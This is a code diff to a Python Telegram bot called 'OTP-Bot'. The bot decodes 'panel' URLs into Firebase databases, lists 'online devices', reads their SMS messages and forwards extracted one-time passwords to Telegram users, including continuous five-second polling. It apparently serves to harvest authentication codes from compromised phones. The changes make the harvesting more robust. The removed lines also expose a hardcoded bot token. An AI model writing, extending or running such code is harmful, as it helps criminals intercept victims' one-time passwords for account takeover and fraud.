@@ -11,7 +11,8 @@ logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(level
 log = logging.getLogger("OTP-Bot")
 
 # ================= CONFIGURATION =================
-BOT_TOKEN = "8496486026:AAFvD384WU4sJn6PeG3pt9OYlGuOVVFto44a"
+# Token Render ke Environment Variables se aayega, code me hardcode mat karna
+BOT_TOKEN = os.getenv("BOT_TOKEN", "YAHAN_APNA_NEW_TOKEN_DAAL_NA")
 OWNER_ID = 8480878371
 DATA_FILE = "data.json"
 # =================================================
@@ -66,14 +67,18 @@ def decode_panel_url(panel_url):
     try:
         b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
         decoded = base64.b64decode(b64_str).decode('utf-8')
+        # Handle the "|||" format from the second panel
+        if "|||" in decoded:
+            urls = decoded.split("|||")
+            return urls[0], ""
+        # Handle JSON format
         try:
             data = json.loads(decoded)
             if isinstance(data, dict) and "url" in data:
                 return data["url"], data.get("key", "")
         except json.JSONDecodeError:
             if decoded.startswith("http"):
-                urls = decoded.split("|||")
-                return urls[0], ""
+                return decoded, ""
     except Exception:
         pass
     return None
@@ -96,7 +101,14 @@ async def get_online_devices():
     return devices
 
 async def get_messages(fb_url, dev_id, auth=None):
-    url = f"{fb_url}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=50"
+    # Using the exact API structure from your curl requests
+    url = f"{fb_url}/messages/{dev_id}.json"
+    # Adding params to fetch latest 50
+    if "?" in url:
+        url += "&orderBy=%22%24key%22&limitToLast=50"
+    else:
+        url += "?orderBy=%22%24key%22&limitToLast=50"
+        
     data = await fetch_fb(url, auth)
     if not data: return []
     msgs = []
@@ -139,22 +151,22 @@ async def listen_for_user(user_id):
     
     while user_id in active_listeners:
         msgs = await get_messages(data["fb_url"], data["dev_id"], data["auth"])
-        new_msgs = [m for m in msgs if int(m.get("id", 0)) > data["last_id"]]
-        
-        if new_msgs:
-            for m in reversed(new_msgs):
-                data["last_id"] = int(m.get("id", 0))
-                otp = extract_otp(m.get("message", ""))
-                if otp:
-                    text = f"🔔 **New OTP Received**\n\n"
-                    text += f"📱 Device: `{data['dev_id'][:10]}`\n"
-                    text += f"📩 Sender: `{m.get('sender')}`\n"
-                    text += f"⏰ Time: {m.get('dateTime')}\n\n"
-                    text += f"🔑 **OTP: `{otp}`**\n\n"
-                    text += f"💬 Msg: {m.get('message')[:100]}..."
-                    try:
-                        await bot.send_message(user_id, text, parse_mode="Markdown")
-                    except: pass
+        if msgs:
+            new_msgs = [m for m in msgs if int(m.get("id", 0)) > data["last_id"]]
+            if new_msgs:
+                for m in reversed(new_msgs):
+                    data["last_id"] = int(m.get("id", 0))
+                    otp = extract_otp(m.get("message", ""))
+                    if otp:
+                        text = f"🔔 **New OTP Received**\n\n"
+                        text += f"📱 Device: `{data['dev_id'][:10]}`\n"
+                        text += f"📩 Sender: `{m.get('sender')}`\n"
+                        text += f"⏰ Time: {m.get('dateTime')}\n\n"
+                        text += f"🔑 **OTP: `{otp}`**\n\n"
+                        text += f"💬 Msg: {m.get('message')[:100]}..."
+                        try:
+                            await bot.send_message(user_id, text, parse_mode="Markdown")
+                        except: pass
         await asyncio.sleep(5)
 
 # ================= KEYBOARDS =================
@@ -376,7 +388,11 @@ async def user_get_otp(cq: CallbackQuery):
 
 @router.callback_query(F.data.startswith("dev:"))
 async def device_selected(cq: CallbackQuery):
-    _, dev_id, label, auth = cq.data.split(":")
+    parts = cq.data.split(":")
+    dev_id = parts[1]
+    label = parts[2]
+    auth = parts[3] if len(parts) > 3 else ""
+    
     await cq.message.edit_text("🔄 Fetching recent messages...")
     data = load_data()
     fb = next((f for f in data["firebases"] if f["label"] == label), None)
@@ -406,7 +422,11 @@ async def device_selected(cq: CallbackQuery):
 
 @router.callback_query(F.data.startswith("listen:"))
 async def listen_start(cq: CallbackQuery):
-    _, dev_id, label, auth = cq.data.split(":")
+    parts = cq.data.split(":")
+    dev_id = parts[1]
+    label = parts[2]
+    auth = parts[3] if len(parts) > 3 else ""
+    
     uid = cq.from_user.id
     data = load_data()
     fb = next((f for f in data["firebases"] if f["label"] == label), None)
@@ -430,7 +450,11 @@ async def listen_start(cq: CallbackQuery):
 
 @router.callback_query(F.data.startswith("hist:"))
 async def show_history(cq: CallbackQuery):
-    _, dev_id, label, auth = cq.data.split(":")
+    parts = cq.data.split(":")
+    dev_id = parts[1]
+    label = parts[2]
+    auth = parts[3] if len(parts) > 3 else ""
+    
     data = load_data()
     fb = next((f for f in data["firebases"] if f["label"] == label), None)
     if not fb: return
